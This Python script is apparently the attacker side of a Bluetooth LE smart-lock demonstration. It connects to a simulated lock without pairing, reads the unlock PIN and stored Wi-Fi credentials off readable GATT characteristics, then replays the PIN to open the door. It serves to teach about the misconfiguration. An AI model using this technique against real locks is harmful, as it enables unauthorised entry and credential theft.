"""
INTRUDER  —  runs on the attacker machine (e.g. the Mac).

Demonstrates the impact of the smart lock's misconfiguration. The intruder is
given NO key and NO prior knowledge. It:

  1. finds the lock over the air (by its service UUID),
  2. READS the unlock PIN straight off the lock (this should be impossible),
  3. replays that PIN to the unlock command to open the door,
  4. steals the stored Wi-Fi credentials for good measure.

This is the "attack" half of the three-device demo. Run it AFTER starting
peripheral.py on the lock machine.

    python3 intruder.py
"""
import asyncio
import sys

from bleak import BleakClient, BleakScanner

SERVICE_UUID    = "a07498ca-ad5b-474e-940d-16f1fbe7e8cd"
PIN_CHAR_UUID   = "51ff12bb-3ed8-46e5-b4f9-d64e2fec021b"
STATE_CHAR_UUID = "51ff12bb-3ed8-46e5-b4f9-d64e2fec021c"
UNLOCK_CMD_UUID = "51ff12bb-3ed8-46e5-b4f9-d64e2fec021f"
WIFI_CHAR_UUID  = "51ff12bb-3ed8-46e5-b4f9-d64e2fec021e"


async def find_lock(timeout: float = 12.0):
    """Scan for the device advertising the lock's service UUID."""
    print(f"[*] Scanning for a device advertising {SERVICE_UUID} ...")
    devices = await BleakScanner.discover(timeout=timeout, return_adv=True)
    for _, (device, adv) in devices.items():
        if SERVICE_UUID in [u.lower() for u in adv.service_uuids]:
            print(f"[+] Found the lock: {device.address}  (RSSI {adv.rssi} dBm)")
            return device
    return None


async def read_text(client: BleakClient, uuid: str) -> str:
    raw = bytes(await client.read_gatt_char(uuid))
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return raw.hex()


async def main() -> int:
    lock = await find_lock()
    if lock is None:
        print("[!] Lock not found. Is peripheral.py running and Bluetooth on?")
        return 1

    async with BleakClient(lock) as client:
        print(f"[+] Connected (no pairing, no key provided).\n")

        state = await read_text(client, STATE_CHAR_UUID)
        print(f"    Door state before attack : {state}")

        # The whole point: the PIN should NOT be readable. It is.
        leaked = await read_text(client, PIN_CHAR_UUID)
        pin = leaked.split("=", 1)[1].strip() if "=" in leaked else leaked.strip()
        print(f"[!] Stolen unlock PIN from the lock: {leaked!r}  ->  PIN = {pin}")

        wifi = await read_text(client, WIFI_CHAR_UUID)
        print(f"[!] Stolen Wi-Fi credentials       : {wifi}")

        # Replay the stolen PIN exactly like a legitimate remote would.
        print(f"\n[*] Replaying stolen PIN to the unlock command ...")
        await client.write_gatt_char(UNLOCK_CMD_UUID, pin.encode(), response=True)
        await asyncio.sleep(0.5)

        state = await read_text(client, STATE_CHAR_UUID)
        print(f"    Door state after attack  : {state}")

        if state.strip().upper().endswith("UNLOCKED"):
            print("\n[+] DOOR OPENED. The intruder was never given the key — it read it off the lock.")
            return 0
        print("\n[!] Door did not open; check the lock output.")
        return 2


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except KeyboardInterrupt:
        sys.exit(130)
